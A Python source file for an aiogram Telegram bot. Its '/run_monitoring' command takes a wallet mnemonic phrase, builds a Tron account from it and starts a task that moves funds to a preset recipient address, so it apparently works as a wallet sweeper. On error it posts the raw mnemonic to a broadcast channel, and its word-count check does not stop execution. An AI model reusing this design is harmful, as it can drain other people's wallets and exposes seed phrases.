from aiogram import Router, F
from aiogram.filters import CommandStart, Command
from aiogram.types import Message
from api.tron.account import AsyncAccount

import asyncio

runner_router = Router()

task_list = {}

@runner_router.message(Command("run_monitoring"))
async def start_montoring(message: Message, default_recipient, broadcaster):
    if len(message.text.split(" ")) < 12:
        await message.answer("Mnemonic phrase must be equal 12 18 24 words")
    
    mnemonic_phrase = message.text[16:]
    try:
        account = AsyncAccount(mnemonic_phrase)
        
        if account.address in task_list and not task_list[account.address].done():
            return await message.reply("Мониторинг уже запущен.")
        
        async def monitor_wrapper():
            try:
                await account.run_monitoring(
                    recipient_address=default_recipient,
                    min_amount=10,
                    threshold=0.5
                )
            except Exception as e:
                await broadcaster(f"[ERROR] Monitoring failed for {account.address}: {str(e)}")

        task = asyncio.create_task(
            monitor_wrapper(),
            name=f"monitor_{account.address}"
        )
        task_list[account.address] = task
        await message.answer(f"[INFO] Мониторинг для {account.address} запущен!")
        await broadcaster(f"[INFO] Started monitoring for {account.address}")
    except:
        await broadcaster(f"[ERROR] Can't run monitoring for {mnemonic_phrase}")
        
    